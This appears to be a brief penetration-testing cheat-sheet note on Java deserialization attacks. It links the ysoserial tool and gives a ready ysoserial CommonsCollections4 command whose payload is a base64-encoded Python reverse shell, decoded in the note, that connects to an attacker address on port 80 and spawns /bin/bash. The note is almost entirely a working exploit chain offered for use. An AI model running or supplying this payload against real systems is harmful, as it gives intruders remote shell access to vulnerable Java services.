# Java Object Deserialization

[https://github.com/frohoff/ysoserial\
https://book.hacktricks.xyz/pentesting-web/deserialization#exploit\
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar](https://github.com/frohoff/ysoserialhttps://book.hacktricks.xyz/pentesting-web/deserialization#exploithttps://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

ysoserial-master-8eb5cbfbf6-1.jar

`java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxOTIuMTY4LjQ5LjE4MSI7ZXhwb3J0IFJQT1JUPTgwO3B5dGhvbiAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIikn}|{base64,-d}|{bash,-i}" > recycler.ser`

Base64 Encoded: export RHOST="192.168.49.181";export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
